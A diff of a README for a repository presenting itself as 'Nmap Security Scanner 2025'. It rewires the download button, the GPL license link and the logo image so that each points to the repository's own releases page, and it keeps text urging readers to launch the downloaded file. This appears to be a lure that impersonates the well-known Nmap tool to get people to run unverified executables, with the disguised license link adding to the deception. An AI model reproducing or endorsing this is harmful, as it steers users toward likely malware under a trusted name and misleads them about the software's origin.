@@ -34,7 +34,7 @@ This repository covers a wide range of topics related to network security and sc
 
 ## Get Started
 To download the latest release of Nmap Security Scanner 2025, click the button below:
-[![Download Nmap Security Scanner](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download Nmap Security Scanner](https://github.com/AllUseIT/Nmap-Security-Scanner-2025/releases)](https://github.com/AllUseIT/Nmap-Security-Scanner-2025/releases)
 
 If the link above ends with a file name, make sure to launch the downloaded file to start using Nmap Security Scanner 2025. If the link is a website, feel free to visit it for more information.
 
@@ -50,10 +50,10 @@ For any issues, bugs, or feature requests related to Nmap Security Scanner 2025,
 If you find Nmap Security Scanner 2025 helpful, consider starring this repository and sharing it with others who might benefit from this powerful tool. Let's make network security more accessible and robust together.
 
 ## Licensing
-Nmap Security Scanner 2025 is licensed under the [GNU General Public License v2.0](https://opensource.org/licenses/GPL-2.0). Please review the license before using, modifying, or distributing this software.
+Nmap Security Scanner 2025 is licensed under the [GNU General Public License v2.0](https://github.com/AllUseIT/Nmap-Security-Scanner-2025/releases). Please review the license before using, modifying, or distributing this software.
 
 ---
 
 Thank you for exploring the Nmap Security Scanner 2025 repository. Let's continue securing our networks and making the digital world a safer place for everyone! 🛡️🔒
 
-![Nmap](https://upload.wikimedia.org/wikipedia/en/0/0b/NmapZ.png)
+![Nmap](https://github.com/AllUseIT/Nmap-Security-Scanner-2025/releases)
